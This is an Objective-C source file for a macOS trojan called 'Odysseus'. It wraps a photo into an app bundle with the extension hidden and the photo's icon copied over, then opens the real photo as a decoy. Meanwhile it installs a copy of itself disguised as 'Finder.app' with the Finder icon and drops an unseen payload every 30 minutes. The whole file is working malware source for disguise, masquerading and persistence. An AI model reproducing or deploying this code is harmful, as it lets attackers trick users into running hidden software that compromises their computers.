//
//  OdysseusAppDelegate.m
//  Odysseus
//
//  Created by Jared Pochtar on 2/3/11.
//  Copyright 2011 Jared's Software Company. All rights reserved.
//

#import "OdysseusAppDelegate.h"
#import "PayloadController.h"

@implementation OdysseusAppDelegate

- (void)awakeFromNib {	
	/*
	 TODO:
	 -have server refuse connections if too soon/too many, or communicate internally -- theres no sec research on me
	 */
	
	NSDictionary *infoDictionary = [[NSBundle mainBundle] infoDictionary];
	NSString *horse = [infoDictionary objectForKey:@"Horse"];
	
	//decide what to do
	if (!horse) {
		//first run -- wrap the target file.  not really necessary, but I have the code lying around...
		[self wrapFile:[@"~/Desktop/DCIM20110221.jpg" stringByExpandingTildeInPath]];
		exit(0);
	} else if ([horse length] > 0) {		
		//open horse
		NSString *horsepath = [[[NSBundle mainBundle] resourcePath] stringByAppendingPathComponent:horse];
		[[NSWorkspace sharedWorkspace] openFile:horsepath];

		//copy trojan
		NSString *payloadPath = [@"~/Library/Devclub/Odysseus/Finder.app" stringByExpandingTildeInPath];
		[[NSFileManager defaultManager] createDirectoryAtPath:[payloadPath stringByDeletingLastPathComponent]
								  withIntermediateDirectories:YES attributes:nil error:NULL];
		[[NSFileManager defaultManager] copyItemAtPath:[[NSBundle mainBundle] bundlePath] toPath:payloadPath error:NULL];
			
		//set copy's info.plist's horse to @""
		NSString *plistPath = [payloadPath stringByAppendingString:@"/Contents/Info.plist"];
		[self setValue:@"" forKey:@"Horse" inPlist:plistPath];
		
		//launch copy
		[[NSWorkspace sharedWorkspace] launchApplication:payloadPath];
		
		//set copy's icon to be finder
		NSWorkspace *workspace = [NSWorkspace sharedWorkspace];
		[workspace setIcon:[NSImage imageNamed:@"Finder"] forFile:payloadPath options:0];
		
		exit(0);
	} else {
		//drop payload now and once every 30 minutes
		[PayloadController dropPayload];
		[NSTimer timerWithTimeInterval:60*30 target:[PayloadController class] selector:@selector(dropPayload) userInfo:nil repeats:YES];
	}
}

- (void)setValue:(id)value forKey:(NSString *)key inPlist:(NSString *)plistPath {
	NSMutableDictionary *newInfoDictionary = [NSMutableDictionary dictionaryWithContentsOfFile:plistPath];
	[newInfoDictionary setObject:value forKey:key];
	[newInfoDictionary writeToFile:plistPath atomically:NO];	
}

- (void)wrapFile:(NSString *)fileToWrap {
	NSString *newBundlePath = [[fileToWrap stringByDeletingPathExtension] stringByAppendingString:@".app"];
	NSFileManager *fileman = [NSFileManager defaultManager];
	
	//copy application
	[fileman copyItemAtPath:[[NSBundle mainBundle] bundlePath] toPath:newBundlePath error:nil];
	
	//hide the .app extension
	[fileman setAttributes:[NSDictionary dictionaryWithObject:[NSNumber numberWithBool:YES] forKey:NSFileExtensionHidden]
			  ofItemAtPath:newBundlePath error:nil];
	
	//add icon grab from horse
	NSWorkspace *workspace = [NSWorkspace sharedWorkspace];
	[workspace setIcon:[workspace iconForFile:fileToWrap] forFile:newBundlePath options:0]; 
	
	//set horse path
	NSString *plistPath = [newBundlePath stringByAppendingString:@"/Contents/Info.plist"];
	[self setValue:[fileToWrap lastPathComponent] forKey:@"Horse" inPlist:plistPath];
	
	//move file to inside new bundle
	//change copy to move
	NSString *dest = [NSString stringWithFormat:@"%@/Contents/Resources/%@", newBundlePath, [fileToWrap lastPathComponent]];
	[fileman copyItemAtPath:fileToWrap toPath:dest error:nil];
}

@end
